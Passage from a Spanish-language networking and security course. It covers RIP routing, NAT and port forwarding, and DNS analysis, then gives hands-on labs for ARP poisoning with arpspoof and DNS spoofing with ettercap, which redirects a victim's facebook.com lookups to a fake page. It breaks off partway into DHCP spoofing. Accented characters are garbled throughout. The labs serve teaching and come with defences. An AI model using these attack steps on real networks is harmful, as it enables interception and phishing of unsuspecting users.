### ğŸ—ï¸ Ejemplo prÃ¡ctico completo: ConfiguraciÃ³n de enrutamiento dinÃ¡mico con RIP

#### ğŸ¯ Objetivo:

Hacer que dos PCs en redes diferentes puedan comunicarse **sin configurar rutas manuales**, usando **RIP**.

---

#### ğŸ§± TopologÃ­a:

```
[PC1] â€” [R1] â€” [R2] â€” [PC2]

Red A (PC1 - R1): 192.168.1.0/24
Red B (PC2 - R2): 10.0.0.0/24
Red entre routers: 192.168.2.0/30
```

---

#### 1ï¸âƒ£ Configurar interfaces y direcciones IP

##### ğŸ”¹ En R1:

```plaintext
Router> enable
Router# configure terminal

Router(config)# interface g0/0
Router(config-if)# ip address 192.168.1.1 255.255.255.0
Router(config-if)# no shutdown

Router(config)# interface g0/1
Router(config-if)# ip address 192.168.2.1 255.255.255.252
Router(config-if)# no shutdown
```

##### ğŸ”¹ En R2:

```plaintext
Router> enable
Router# configure terminal

Router(config)# interface g0/0
Router(config-if)# ip address 192.168.2.2 255.255.255.252
Router(config-if)# no shutdown

Router(config)# interface g0/1
Router(config-if)# ip address 10.0.0.1 255.255.255.0
Router(config-if)# no shutdown
```

---

#### 2ï¸âƒ£ Configurar PCs

- **PC1:**

  - IP: `192.168.1.2`
  - MÃ¡scara: `255.255.255.0`
  - Gateway: `192.168.1.1`

- **PC2:**

  - IP: `10.0.0.2`
  - MÃ¡scara: `255.255.255.0`
  - Gateway: `10.0.0.1`

---

#### 3ï¸âƒ£ Configurar enrutamiento dinÃ¡mico con RIP

##### ğŸ”¸ En R1:

```plaintext
Router(config)# router rip
Router(config-router)# version 2
Router(config-router)# no auto-summary
Router(config-router)# network 192.168.1.0
Router(config-router)# network 192.168.2.0
```

##### ğŸ”¸ En R2:

```plaintext
Router(config)# router rip
Router(config-router)# version 2
Router(config-router)# no auto-summary
Router(config-router)# network 192.168.2.0
Router(config-router)# network 10.0.0.0
```

---

#### 4ï¸âƒ£ Probar conectividad

Desde **PC1**, haz ping a **PC2**:

```bash
ping 10.0.0.2
```

DeberÃ­as ver:

```
Reply from 10.0.0.2: bytes=32 time<1ms TTL=255
```

âœ… Â¡Funcionando! RIP aprendiÃ³ automÃ¡ticamente las rutas.

---

### ğŸ“– Â¿QuÃ© aprendiste?

- QuÃ© es el enrutamiento dinÃ¡mico y cÃ³mo funciona
- CÃ³mo instalarlo/configurarlo usando RIP
- CÃ³mo conectar dos redes sin rutas estÃ¡ticas
- CÃ³mo probar que el enrutamiento dinÃ¡mico funciona

---

### ğŸ Extra: Â¿CÃ³mo ver las rutas aprendidas?

En cada router escribe:

```plaintext
Router# show ip route
```

DeberÃ­as ver entradas con una letra **R** (de RIP), asÃ­:

```
R    10.0.0.0/24 [120/1] via 192.168.2.2, 00:00:15, GigabitEthernet0/1
```

---

### ğŸ“Œ ConclusiÃ³n

El **enrutamiento dinÃ¡mico** permite que tus routers aprendan y se adapten solos. Con protocolos como RIP, puedes conectar redes fÃ¡cilmente y sin errores manuales. Es ideal para redes medianas, laboratorios y ambientes en crecimiento.

---

[ğŸ”¼](#Ã­ndice)

---

## **809. ConfiguraciÃ³n de segundo enrutador y verificaciÃ³n de tablas de enrutamiento**

### ğŸ” Â¿QuÃ© significa configurar un segundo enrutador?

Cuando tienes mÃ¡s de una red, a menudo necesitas mÃ¡s de un router. **Agregar un segundo enrutador** permite conectar varias redes entre sÃ­. Para que funcione, ambos routers deben tener rutas hacia las redes conectadas al otro.

---

### ğŸ“Œ Â¿QuÃ© implica esta configuraciÃ³n?

- Asignar IPs a las interfaces del segundo router
- Conectarlo al primer router
- Configurar **enrutamiento dinÃ¡mico** o **enrutamiento estÃ¡tico**
- Verificar que los dispositivos de un lado lleguen al otro
- Revisar la **tabla de enrutamiento**, que muestra por dÃ³nde salen los paquetes

---

### ğŸ§° Â¿QuÃ© necesitas para este laboratorio?

#### âœ… Equipos en **Packet Tracer**:

- 2 routers (R1 y R2)
- 2 PCs (PC1 y PC2)
- Cables
- ConfiguraciÃ³n bÃ¡sica de IP

---

### ğŸ’¡ Escenario de ejemplo

```
PC1 ---- R1 ---- R2 ---- PC2
```

- Red A (PC1 â†” R1): `192.168.1.0/24`
- Red B (R1 â†” R2): `192.168.2.0/30`
- Red C (R2 â†” PC2): `10.0.0.0/24`

---

### ğŸ”§ Paso a paso: ConfiguraciÃ³n de segundo router y verificaciÃ³n

---

#### 1ï¸âƒ£ Asignar direcciones IP

##### ğŸ“ R1:

```plaintext
enable
configure terminal

interface g0/0
ip address 192.168.1.1 255.255.255.0
no shutdown

interface g0/1
ip address 192.168.2.1 255.255.255.252
no shutdown
```

---

##### ğŸ“ R2 (el **segundo enrutador**):

```plaintext
enable
configure terminal

interface g0/0
ip address 192.168.2.2 255.255.255.252
no shutdown

interface g0/1
ip address 10.0.0.1 255.255.255.0
no shutdown
```

---

#### 2ï¸âƒ£ Configurar las PCs

- **PC1**: IP: `192.168.1.10`, MÃ¡scara: `255.255.255.0`, Gateway: `192.168.1.1`
- **PC2**: IP: `10.0.0.10`, MÃ¡scara: `255.255.255.0`, Gateway: `10.0.0.1`

---

#### 3ï¸âƒ£ Configurar enrutamiento entre routers

Usaremos **RIP** (enrutamiento dinÃ¡mico) para que **ambos routers compartan rutas automÃ¡ticamente**.

##### ğŸ”¹ En R1:

```plaintext
router rip
version 2
no auto-summary
network 192.168.1.0
network 192.168.2.0
```

---

##### ğŸ”¹ En R2:

```plaintext
router rip
version 2
no auto-summary
network 192.168.2.0
network 10.0.0.0
```

---

#### 4ï¸âƒ£ Verificar conectividad

##### Desde **PC1**, haz ping a **PC2**:

```bash
ping 10.0.0.10
```

DeberÃ­as ver respuestas exitosas. Si no, revisa cables, IPs y configuraciÃ³n.

---

#### 5ï¸âƒ£ Verificar tabla de enrutamiento en ambos routers

Esto es **clave para saber si los routers estÃ¡n aprendiendo las rutas correctamente**.

##### En **R1**:

```plaintext
show ip route
```

DeberÃ­as ver una lÃ­nea como esta:

```
R    10.0.0.0/24 [120/1] via 192.168.2.2, 00:00:25, GigabitEthernet0/1
```

âœ… Esto significa que R1 ha aprendido la ruta hacia la red 10.0.0.0 a travÃ©s de R2.

---

##### En **R2**:

```plaintext
show ip route
```

Y verÃ¡s algo como:

```
R    192.168.1.0/24 [120/1] via 192.168.2.1, 00:00:15, GigabitEthernet0/0
```

âœ… Lo que indica que R2 conoce cÃ³mo llegar a la red 192.168.1.0 a travÃ©s de R1.

---

### ğŸ“ Â¿QuÃ© significa la salida `show ip route`?

La tabla de enrutamiento muestra:

- Las **rutas conocidas**
- **CÃ³mo** y **por dÃ³nde** llegar a esas redes
- QuÃ© protocolo las aprendiÃ³:

  - `R` â†’ RIP
  - `O` â†’ OSPF
  - `C` â†’ Conectada directamente
  - `S` â†’ EstÃ¡tica

---

### ğŸ§ª Resumen de comandos importantes

| Comando               | Â¿Para quÃ© sirve?                       |
| --------------------- | -------------------------------------- |
| `show ip route`       | Ver las rutas aprendidas               |
| `ping <IP>`           | Verificar conectividad                 |
| `traceroute <IP>`     | Ver por quÃ© camino viaja un paquete    |
| `show running-config` | Ver la configuraciÃ³n actual del router |

---

### ğŸ ConclusiÃ³n

âœ… Configurar un segundo router permite extender tu red a nuevas subredes.

âœ… Con enrutamiento dinÃ¡mico como **RIP**, los routers aprenden automÃ¡ticamente cÃ³mo comunicarse.

âœ… Verificar las **tablas de enrutamiento** es esencial para asegurarte de que todo estÃ© conectado correctamente.

---

[ğŸ”¼](#Ã­ndice)

---

## **810. ConfiguraciÃ³n de NAT y redireccionamiento**

### ğŸŒ Â¿QuÃ© es NAT?

**NAT (Network Address Translation)** es una tÃ©cnica usada en routers que permite traducir direcciones IP privadas (por ejemplo, 192.168.x.x) a una IP pÃºblica (por ejemplo, 187.45.80.1) y viceversa.

> ğŸ§  Se usa para que los dispositivos de una red privada puedan **salir a Internet usando una Ãºnica IP pÃºblica**.

---

#### ğŸ“¦ Tipos de NAT

| Tipo                   | Â¿QuÃ© hace?                                                            |
| ---------------------- | --------------------------------------------------------------------- |
| **NAT EstÃ¡tica**       | Mapea una IP privada a una IP pÃºblica fija (1:1).                     |
| **NAT DinÃ¡mica**       | Usa un grupo de IPs pÃºblicas y las asigna dinÃ¡micamente.              |
| **PAT (NAT Overload)** | Traduce muchas IPs privadas a una sola IP pÃºblica usando **puertos**. |

ğŸ” **PAT es el mÃ¡s comÃºn** y es el que usan los routers domÃ©sticos y empresas pequeÃ±as.

---

### ğŸ§­ Â¿QuÃ© es el redireccionamiento de puertos?

El **redireccionamiento de puertos (Port Forwarding)** es una funciÃ³n de NAT que permite:

- Enviar el trÃ¡fico que llega a la IP pÃºblica del router en un **puerto especÃ­fico (ej. 80, 22, 3389)** a una **mÃ¡quina interna** de la red.

ğŸ“Œ Ejemplo:

Tu router recibe una conexiÃ³n en el puerto 80, y lo redirige al servidor web interno 192.168.1.100.

---

### ğŸ› ï¸ Â¿CÃ³mo se configura NAT?

Vamos a usar **Cisco Packet Tracer** para el ejemplo, pero tambiÃ©n puedes aplicarlo en GNS3 o un router real.

---

#### ğŸ§° Equipos necesarios para el ejemplo

- 1 Router
- 2 PCs (una interna, una externa simulando Internet)
- 1 servidor web (opcional)
- Red interna: `192.168.1.0/24`
- Red externa (ISP): `200.0.0.0/30`

---

### âš™ï¸ Ejemplo completo paso a paso

#### ğŸ§± Escenario:

```
[PC1]â€”â€”[Router]â€”â€”[PC2 (simula Internet)]

Red interna: 192.168.1.0/24
Red externa: 200.0.0.0/30
IP pÃºblica del router: 200.0.0.1
IP interna del router: 192.168.1.1
PC1 (cliente local): 192.168.1.10
PC2 (cliente externo): 200.0.0.2
```

---

#### 1ï¸âƒ£ Configurar direcciones IP

##### En **PC1 (cliente interno)**:

- IP: `192.168.1.10`
- MÃ¡scara: `255.255.255.0`
- Gateway: `192.168.1.1`

##### En **PC2 (cliente externo/Internet)**:

- IP: `200.0.0.2`
- MÃ¡scara: `255.255.255.252`
- Gateway: `200.0.0.1`

---

#### 2ï¸âƒ£ Configurar interfaces del router

```plaintext
Router> enable
Router# configure terminal

! Red interna
interface FastEthernet0/0
ip address 192.168.1.1 255.255.255.0
ip nat inside
no shutdown

! Red externa (Internet)
interface FastEthernet0/1
ip address 200.0.0.1 255.255.255.252
ip nat outside
no shutdown
```

---

#### 3ï¸âƒ£ Configurar NAT con PAT (NAT Overload)

##### Paso 1: Crear la lista de acceso que identifique las IPs internas

```plaintext
access-list 1 permit 192.168.1.0 0.0.0.255
```

##### Paso 2: Aplicar la traducciÃ³n NAT

```plaintext
ip nat inside source list 1 interface FastEthernet0/1 overload
```

âœ… Esto indica: "Las IPs de la red 192.168.1.0 saldrÃ¡n por la interfaz externa con traducciÃ³n NAT utilizando la IP pÃºblica del router (200.0.0.1) y distintos puertos".

---

#### 4ï¸âƒ£ VerificaciÃ³n

Desde **PC1**, haz ping a **PC2 (Internet)**:

```bash
ping 200.0.0.2
```

ğŸ” En el router, puedes verificar las traducciones NAT activas:

```plaintext
show ip nat translations
```

VerÃ¡s algo asÃ­:

```
Pro Inside global    Inside local     Outside local      Outside global
udp 200.0.0.1:1025   192.168.1.10:1025   200.0.0.2:53       200.0.0.2:53
```

---

#### ğŸ” Â¿Y si quieres redirigir un puerto (ej. HTTP)?

##### ğŸ§© Redireccionamiento de puerto 80 al servidor web interno

SupÃ³n que tienes un servidor web en 192.168.1.100 (interna), y quieres que cualquier persona que acceda a 200.0.0.1 en el puerto 80 sea redirigida al servidor web.

```plaintext
ip nat inside source static tcp 192.168.1.100 80 200.0.0.1 80
```

âœ… Esto le dice al router:
"Cuando alguien se conecte por **TCP** al **puerto 80** en mi IP pÃºblica (200.0.0.1), redirÃ­gelo al puerto 80 del host interno **192.168.1.100**".

---

#### ğŸ” VerificaciÃ³n de redireccionamiento

Desde **PC2 (Internet)**, abre navegador o haz:

```bash
telnet 200.0.0.1 80
```

O si usas Packet Tracer, puedes usar el navegador del PC externo. Si todo estÃ¡ bien, Â¡verÃ¡s la pÃ¡gina web del servidor interno!

---

### ğŸ“– Comandos importantes

| Comando                    | DescripciÃ³n                                  |
| -------------------------- | -------------------------------------------- |
| `ip nat inside`            | Define interfaz como parte de la red privada |
| `ip nat outside`           | Define interfaz como parte de Internet       |
| `access-list 1 permit ...` | Permite el rango de IPs a traducir           |
| `ip nat inside source ...` | Aplica la traducciÃ³n                         |
| `show ip nat translations` | Muestra las traducciones activas             |
| `show ip nat statistics`   | EstadÃ­sticas de NAT                          |

---

### âœ… ConclusiÃ³n

El **NAT** permite a tus dispositivos locales navegar en Internet sin tener IPs pÃºblicas. El **redireccionamiento de puertos** permite que servicios internos (como un servidor web) sean accesibles desde fuera.

Con estos pasos puedes:

- Configurar NAT dinÃ¡mico (PAT)
- Redirigir puertos a servidores internos
- Verificar el funcionamiento con comandos clave

---

[ğŸ”¼](#Ã­ndice)

---

## **811. AnÃ¡lisis de DNS**

![DNS](../img/7_Ciberseguridad_Profesional/DNS_SERVER.webp "DNS")

### ğŸŒ Â¿QuÃ© es DNS?

**DNS (Domain Name System)** es el sistema que traduce nombres de dominio legibles por humanos (como `www.google.com`) a direcciones IP (como `142.250.190.68`) que las computadoras usan para comunicarse.

> ğŸ¯ Es como la guÃ­a telefÃ³nica de Internet: tÃº buscas un nombre, y DNS te da el nÃºmero.

---

### ğŸ” Â¿QuÃ© es el anÃ¡lisis de DNS?

El **anÃ¡lisis de DNS** es el proceso de investigar cÃ³mo se resuelve un dominio, quÃ© registros tiene, cÃ³mo responde un servidor DNS, y si existen posibles problemas o manipulaciones (por ejemplo, ataques DNS spoofing).

---

### ğŸ§  Â¿Para quÃ© sirve?

- ğŸ” Detectar dominios falsos o maliciosos
- ğŸ’» Analizar trÃ¡fico de red en pruebas de pentesting
- ğŸ“¡ Ver cÃ³mo se resuelve un dominio (registros A, MX, NS, TXT)
- ğŸ” Verificar configuraciones de seguridad (como SPF, DKIM)
- ğŸ•µï¸â€â™‚ï¸ Descubrir infraestructura de una organizaciÃ³n

---

### ğŸ› ï¸ Herramientas para anÃ¡lisis de DNS

AquÃ­ hay algunas herramientas Ãºtiles, con instalaciÃ³n y ejemplos:

#### ğŸ”§ 1. **`nslookup`** (integrado en Windows, Linux, macOS)

Consulta simple de DNS.

##### âœ… Uso bÃ¡sico:

```bash
nslookup www.google.com
```

#### ğŸ” Ver registros especÃ­ficos:

```bash
nslookup
> set type=MX
> gmail.com
```

---

#### ğŸ”§ 2. **`dig`** (Linux/macOS; instalar en Windows con WSL o Git Bash)

Herramienta mÃ¡s avanzada que `nslookup`.

##### ğŸ§ª InstalaciÃ³n en Linux (Debian/Ubuntu):

```bash
sudo apt update && sudo apt install dnsutils
```

##### âœ… Uso bÃ¡sico:

```bash
dig www.google.com
```

#### ğŸ” Ver registros especÃ­ficos:

```bash
dig google.com MX
dig google.com NS
dig google.com TXT
```

#### ğŸŒ Consulta inversa:

```bash
dig -x 8.8.8.8
```

---

#### ğŸ”§ 3. **`whois`** (verifica datos del dominio)

##### InstalaciÃ³n en Linux:

```bash
sudo apt install whois
```

##### Uso:

```bash
whois google.com
```

---

#### ğŸ”§ 4. **Wireshark** (anÃ¡lisis de trÃ¡fico DNS en la red)

- Es un analizador de paquetes.
- Puedes capturar trÃ¡fico y filtrar por protocolo DNS.

##### Filtro para DNS:

```
dns
```

##### Para ver solo solicitudes:

```
dns.flags.response == 0
```

---

### ğŸ›¡ï¸ AnÃ¡lisis en Pentesting / Seguridad

Durante una auditorÃ­a, el anÃ¡lisis DNS se usa para:

- **Descubrir subdominios**: como `vpn.empresa.com`, `mail.empresa.com`
- **Recolectar informaciÃ³n**: registros MX (correo), TXT (verificaciones), etc.
- **Analizar trÃ¡fico DNS**: buscar comunicaciones maliciosas o DNS tunneling

---

### ğŸ§ª Ejemplo completo: AnÃ¡lisis de dominio con `dig` y `whois`

#### Paso 1: Verificar registros A (direcciÃ³n IP del dominio)

```bash
dig github.com A
```

Salida esperada:

```bash
;; ANSWER SECTION:
github.com.   60  IN  A  140.82.114.3
```

#### Paso 2: Ver registros NS (servidores DNS del dominio)

```bash
dig github.com NS
```

Ejemplo:

```
github.com.  172800  IN  NS  ns-421.awsdns-52.com.
```

#### Paso 3: Ver registros MX (correo)

```bash
dig github.com MX
```

Ejemplo:

```
github.com.  3600 IN MX 10 aspmx.l.google.com.
```

#### Paso 4: Ver registros TXT (pueden incluir SPF, seguridad, etc.)

```bash
dig github.com TXT
```

Ejemplo:

```
"v=spf1 include:_spf.google.com ~all"
```

#### Paso 5: Consulta `whois`

```bash
whois github.com
```

Ejemplo:

```
Registrar: MarkMonitor Inc.
Creation Date: 2007-03-09T21:10:36Z
...
Name Server: ns-421.awsdns-52.com
```

---

### ğŸ§ª Ejemplo con Wireshark (anÃ¡lisis de trÃ¡fico DNS)

1. Abre **Wireshark**
2. Comienza la captura en tu interfaz de red
3. Abre un navegador y visita `www.google.com`
4. En Wireshark, usa el filtro:

```
dns
```

5. VerÃ¡s paquetes DNS como:

```
Standard query 0x1a3a A www.google.com
Standard query response 0x1a3a A 142.250.64.196
```

âœ… AsÃ­ puedes ver cÃ³mo el DNS resuelve dominios en tiempo real.

---

### âœ… ConclusiÃ³n

| Herramienta | Â¿Para quÃ© sirve?                      |
| ----------- | ------------------------------------- |
| `nslookup`  | Consultas bÃ¡sicas de DNS              |
| `dig`       | Consultas avanzadas y detalladas      |
| `whois`     | InformaciÃ³n de registro del dominio   |
| `Wireshark` | Ver trÃ¡fico DNS en red en tiempo real |

ğŸ” Analizar DNS es una habilidad fundamental para administradores, pentesters y analistas de seguridad. Permite obtener **informaciÃ³n valiosa** sobre una red o dominio, e incluso descubrir posibles **vulnerabilidades o errores de configuraciÃ³n**.

---

[ğŸ”¼](#Ã­ndice)

---

## **812. ARP Poisoning**

![ARP Poisoning](../img/7_Ciberseguridad_Profesional/ARP_Poisoning.jpg "ARP Poisoning")

### ğŸ” Â¿QuÃ© es ARP?

**ARP (Address Resolution Protocol)** es el protocolo que traduce direcciones IP a direcciones MAC dentro de una red local.

ğŸ“¦ Ejemplo simple:

> Si tu PC quiere enviar datos a la IP `192.168.1.5`, primero debe saber cuÃ¡l es la **MAC** asociada a esa IP.
>
> Para eso, **pregunta por ARP**:
>
> â€œÂ¿QuiÃ©n tiene la IP 192.168.1.5?â€
>
> Y esa mÃ¡quina responde con su MAC.

---

### ğŸš¨ Â¿QuÃ© es ARP Poisoning?

**ARP Poisoning** o **Envenenamiento ARP** es un **ataque de suplantaciÃ³n (spoofing)** en una red local (LAN) donde el atacante **envÃ­a respuestas ARP falsas** para engaÃ±ar a los dispositivos y redirigir el trÃ¡fico hacia Ã©l.

ğŸ¯ Objetivo: Interceptar, espiar o modificar el trÃ¡fico entre dos dispositivos.

---

#### ğŸ§  Â¿CÃ³mo funciona?

1. En una red LAN, todos confÃ­an en las respuestas ARP sin validarlas.
2. El atacante envÃ­a mensajes falsos diciendo:

   - â€œÂ¡La IP del router soy yo!â€ (para la vÃ­ctima)
   - â€œÂ¡La IP de la vÃ­ctima soy yo!â€ (para el router)

3. Ambos creen que el atacante es el otro.
4. El atacante **intercepta el trÃ¡fico**: esto se llama **MITM (Man-In-The-Middle)**.

---

### ğŸ§° Herramientas necesarias

Para hacer un anÃ¡lisis o demostraciÃ³n de ARP Poisoning necesitas:

- ğŸ§ **Kali Linux** o Parrot OS
- ğŸ•µï¸â€â™‚ï¸ Herramientas como:

  - `arpspoof` (de Dsniff)
  - `ettercap`
  - `wireshark` (para ver el trÃ¡fico)
  - `netdiscover` (opcional, para escaneo ARP)

---

### ğŸ§ª InstalaciÃ³n en Kali Linux

Kali ya incluye muchas herramientas. AsegÃºrate de tener estas:

```bash
sudo apt update
sudo apt install dsniff ettercap-graphical wireshark
```

---

### ğŸ§ª Ejemplo completo: Ataque ARP Poisoning con `arpspoof`

#### ğŸ¯ Escenario de red (LAN)

- Router: `192.168.1.1`
- VÃ­ctima: `192.168.1.10`
- Atacante (Kali): `192.168.1.100`

---

#### 1ï¸âƒ£ Habilitar reenvÃ­o de paquetes (IP Forwarding)

Esto permite que Kali actÃºe como un puente entre la vÃ­ctima y el router.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

#### 2ï¸âƒ£ Abrir 2 terminales: uno para cada direcciÃ³n

##### Terminal 1: EngaÃ±ar al **router**

```bash
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
```

ğŸ” Le dices al router: â€œYo (el atacante) soy la vÃ­ctimaâ€.

#### Terminal 2: EngaÃ±ar a la **vÃ­ctima**

```bash
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```

ğŸ” Le dices a la vÃ­ctima: â€œYo (el atacante) soy el routerâ€.

> ğŸ”§ Cambia `eth0` por el nombre de tu interfaz de red si es diferente (puedes verlas con `ip a`).

---

#### 3ï¸âƒ£ Abre **Wireshark** para analizar el trÃ¡fico

Filtra solo los paquetes HTTP (si hay) o DNS:

```plaintext
http || dns
```

âœ… VerÃ¡s trÃ¡fico de la vÃ­ctima pasando por tu mÃ¡quina.

---

#### 4ï¸âƒ£ Detener el ataque y restaurar red

Una vez terminado, desactiva el reenvÃ­o:

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

Y reinicia la red de la vÃ­ctima si es necesario (para limpiar su cachÃ© ARP).

---

### ğŸ›¡ï¸ Â¿CÃ³mo protegerse del ARP Poisoning?

1. ğŸ›¡ï¸ Usar **ARP estÃ¡tico** en redes crÃ­ticas (IP â†” MAC fijas).
2. ğŸ”’ Usar herramientas de detecciÃ³n (como `arpwatch`).
3. ğŸ’¡ Activar detecciÃ³n de ARP spoofing en switches (port security).
4. ğŸ” Usar cifrado de extremo a extremo (HTTPS, VPN).

---

### ğŸ§  Comandos Ãºtiles

| Comando                      | FunciÃ³n                         |
| ---------------------------- | ------------------------------- |
| `ip a`                       | Ver interfaces y direcciones IP |
| `arpspoof -i eth0 -t X Y`    | Envenenar ARP entre X y Y       |
| `echo 1 > /proc/sys/net/...` | Activar reenvÃ­o IP              |
| `wireshark`                  | Analizar paquetes               |
| `arp -a` (en vÃ­ctima)        | Ver tabla ARP                   |

---

### âœ… ConclusiÃ³n

| Concepto          | Detalles                                           |
| ----------------- | -------------------------------------------------- |
| **ARP Poisoning** | Ataque donde el atacante engaÃ±a a dispositivos ARP |
| **Objetivo**      | Interceptar trÃ¡fico o manipular conexiones         |
| **Herramientas**  | `arpspoof`, `ettercap`, `wireshark`                |
| **Requisitos**    | Estar en la misma red LAN que la vÃ­ctima           |
| **PrevenciÃ³n**    | ARP estÃ¡tico, switches inteligentes, VPN           |

---

[ğŸ”¼](#Ã­ndice)

---

## **813. DNS Spoofing**

![DNS Spoofing](../img/7_Ciberseguridad_Profesional/DNS_Spoofing.png "DNS Spoofing")

### ğŸŒ Â¿QuÃ© es DNS Spoofing?

**DNS Spoofing** (tambiÃ©n llamado **DNS cache poisoning**) es un tipo de ataque donde un atacante **envÃ­a respuestas DNS falsas** a una vÃ­ctima con el fin de redirigirla a un sitio web malicioso o falso.

> ğŸ§  En otras palabras: cuando tÃº buscas `facebook.com`, el atacante te engaÃ±a para que tu navegador vaya a otro lugar (por ejemplo, a un sitio falso que parece Facebook).

---

### ğŸ§  Â¿CÃ³mo funciona?

#### âš™ï¸ El proceso normal de resoluciÃ³n DNS:

1. TÃº escribes `facebook.com` en el navegador.
2. Tu equipo pregunta: â€œÂ¿CuÃ¡l es la IP de `facebook.com`?â€
3. Un servidor DNS responde: â€œEs 157.240.229.35â€ (por ejemplo).
4. Tu navegador se conecta a esa IP real.

#### ğŸ§¨ En DNS Spoofing:

1. El atacante **intercepta** o **manipula** la respuesta.
2. El servidor DNS o la vÃ­ctima recibe una IP falsa (por ejemplo, `192.168.1.100`, que es el servidor del atacante).
3. La vÃ­ctima entra a un sitio web falso sin saberlo.

---

### ğŸ¯ Â¿Para quÃ© se usa este ataque?

- **Phishing**: engaÃ±ar a usuarios para robar credenciales.
- **InstalaciÃ³n de malware**: redirigir a sitios infectados.
- **MITM (Man-in-the-Middle)**: interceptar comunicaciones.
- **Pruebas de seguridad**: en pentesting para demostrar riesgos.

---

### ğŸ§° Herramientas necesarias para un laboratorio

1. **Kali Linux** (atacante)
2. **Una vÃ­ctima en la misma red** (por ejemplo, una mÃ¡quina Windows o Android)
3. Herramientas:

   - `ettercap`
   - `wireshark`
   - Opcional: servidor falso usando `apache2` o `dnsspoof`

---

### ğŸ”§ InstalaciÃ³n de herramientas en Kali Linux

```bash
sudo apt update
sudo apt install ettercap-graphical apache2 dsniff wireshark
```

---

### ğŸ§ª Laboratorio: Ataque DNS Spoofing con Ettercap

#### ğŸ“Œ Escenario:

- Kali (atacante): `192.168.1.100`
- VÃ­ctima: `192.168.1.101`
- Red: `192.168.1.0/24`
- Objetivo: cuando la vÃ­ctima busque `facebook.com`, serÃ¡ redirigida a una **pÃ¡gina falsa alojada en Kali**.

---

#### âœ… Paso a paso

##### 1ï¸âƒ£ Habilita IP forwarding (reenviar trÃ¡fico)

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

##### 2ï¸âƒ£ Crea un servidor web falso

```bash
sudo service apache2 start
```

Pon tu pÃ¡gina falsa en:

```bash
cd /var/www/html
sudo nano index.html
```

Contenido simple:

```html
<h1>Esto es un sitio falso de Facebook</h1>
```

##### 3ï¸âƒ£ Configura el archivo de DNS spoofing

Edita el archivo `/usr/share/ettercap/etter.dns`:

```bash
sudo nano /usr/share/ettercap/etter.dns
```

Agrega una lÃ­nea asÃ­:

```
facebook.com A 192.168.1.100
*.facebook.com A 192.168.1.100
```

Eso redirige cualquier subdominio de facebook.com a tu mÃ¡quina Kali.

##### 4ï¸âƒ£ Inicia Ettercap en modo grÃ¡fico

```bash
sudo ettercap -G
```

#### En Ettercap:

1. Ve a `Sniff` â†’ `Unified sniffing`
2. Selecciona tu interfaz de red (ej: `eth0`)
3. Ve a `Hosts` â†’ `Scan for hosts`
4. Ve a `Hosts` â†’ `Host list`
5. Selecciona tu **vÃ­ctima** y el **router**

   - AÃ±ade a la vÃ­ctima como Target 1
   - AÃ±ade al router como Target 2

6. Ve a `Mitm` â†’ `ARP poisoning`

   - Marca **"Sniff remote connections"**

7. Ve a `Plugins` â†’ `Manage plugins`

   - Haz doble clic en `dns_spoof` para activarlo

---

##### 5ï¸âƒ£ Â¡Ataque en acciÃ³n!

- La vÃ­ctima intenta acceder a `facebook.com`
- El navegador serÃ¡ redirigido a tu servidor Apache (el sitio falso)
- Puedes usar **Wireshark** para monitorear y ver las respuestas DNS falsas

---

### ğŸ§ª Resultado esperado:

La vÃ­ctima ve algo como:

```html
<h1>Esto es un sitio falso de Facebook</h1>
```

Y cree estar en el sitio legÃ­timo, aunque fue engaÃ±ada por el atacante.

---

### ğŸ›¡ï¸ Â¿CÃ³mo protegerse?

| Medida                   | ExplicaciÃ³n                                                              |
| ------------------------ | ------------------------------------------------------------------------ |
| ğŸ”’ HTTPS / HSTS          | El navegador puede alertar si el sitio falso no tiene certificado vÃ¡lido |
| ğŸ›¡ï¸ DNSSEC                | Protege las respuestas DNS con firmas digitales                          |
| ğŸ” Seguridad en switches | Evitar ARP Spoofing que permite interceptar paquetes                     |
| ğŸ” VPNs                  | AÃ­slan y encriptan todo el trÃ¡fico, incluso DNS                          |

---

### âœ… Resumen Final

| Tema            | Detalle                                             |
| --------------- | --------------------------------------------------- |
| ğŸ§  QuÃ© es       | Ataque que falsifica respuestas DNS                 |
| ğŸ¯ Objetivo     | Redirigir a la vÃ­ctima a un sitio falso o malicioso |
| ğŸ§° Herramientas | `ettercap`, `apache2`, `wireshark`, `dsniff`        |
| ğŸ›¡ï¸ PrevenciÃ³n   | HTTPS, DNSSEC, seguridad de red local               |

---

[ğŸ”¼](#Ã­ndice)

---

## **814. DHCP Spoofing**

![DHCP Spoofing](../img/7_Ciberseguridad_Profesional/DHCP_Spoofing.jpg "DHCP Spoofing")

### ğŸ§  Â¿QuÃ© es DHCP Spoofing?

**DHCP Spoofing** es un tipo de ataque en redes donde un atacante introduce un **servidor DHCP falso** en la red local para **engaÃ±ar a las vÃ­ctimas** y entregarles informaciÃ³n maliciosa, como una puerta de enlace falsa o un DNS controlado por el atacante.

ğŸ“¦ El objetivo es tomar el control del trÃ¡fico de la vÃ­ctima, redirigirlo o espiar las comunicaciones.

---

### ğŸ§¾ Â¿QuÃ© es DHCP?

**DHCP (Dynamic Host Configuration Protocol)** es el protocolo que asigna automÃ¡ticamente:

- DirecciÃ³n IP
- MÃ¡scara de red
- Puerta de enlace (gateway)
- Servidor DNS

â€¦ a los dispositivos de una red local.

---

### ğŸ§¨ Â¿QuÃ© hace el atacante en DHCP Spoofing?

1. Entra a la red como un host normal.
2. ActÃºa como **falso servidor DHCP**.
3. Cuando una vÃ­ctima se conecta a la red, **recibe configuraciÃ³n maliciosa**:

   - Una **IP vÃ¡lida**.
   - Una **puerta de enlace falsa** (la IP del atacante).
   - Un **servidor DNS falso**.

AsÃ­, todo el trÃ¡fico pasa por el atacante (Man-in-the-Middle).

---

### ğŸ§° Herramientas necesarias

Usaremos **Kali Linux** como atacante. Las herramientas son:

- `dsniff` (para `dhcpd`)
- `dhcpstarv` (opcional, para agotar el DHCP real)
- `iptables` (para redireccionar trÃ¡fico)
- `Wireshark` (para ver quÃ© pasa)

> Todo se puede hacer en una red local real o en un laboratorio con 2 mÃ¡quinas virtuales (Kali + vÃ­ctima Windows/Linux).

---

#### ğŸ”§ InstalaciÃ³n en Kali Linux

La mayorÃ­a ya viene instalada, pero puedes asegurarte con:

```bash
sudo apt update
sudo apt install dsniff isc-dhcp-server wireshark
```

---

### ğŸ“ ConfiguraciÃ³n del servidor DHCP falso

